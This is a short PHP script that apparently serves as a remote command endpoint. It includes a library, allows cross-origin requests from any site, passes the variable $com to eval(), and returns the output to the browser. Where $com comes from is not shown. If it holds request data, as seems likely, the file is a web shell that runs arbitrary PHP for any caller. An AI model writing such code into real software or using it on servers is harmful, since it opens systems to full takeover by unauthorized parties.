<?php

include 'libOAC.php';
session_start();
header("Access-Control-Allow-Origin: *");
ob_start();
eval(" ".$com.";");
$output = ob_get_contents();
ob_end_clean();

echo $output.'<br><br>';

?>
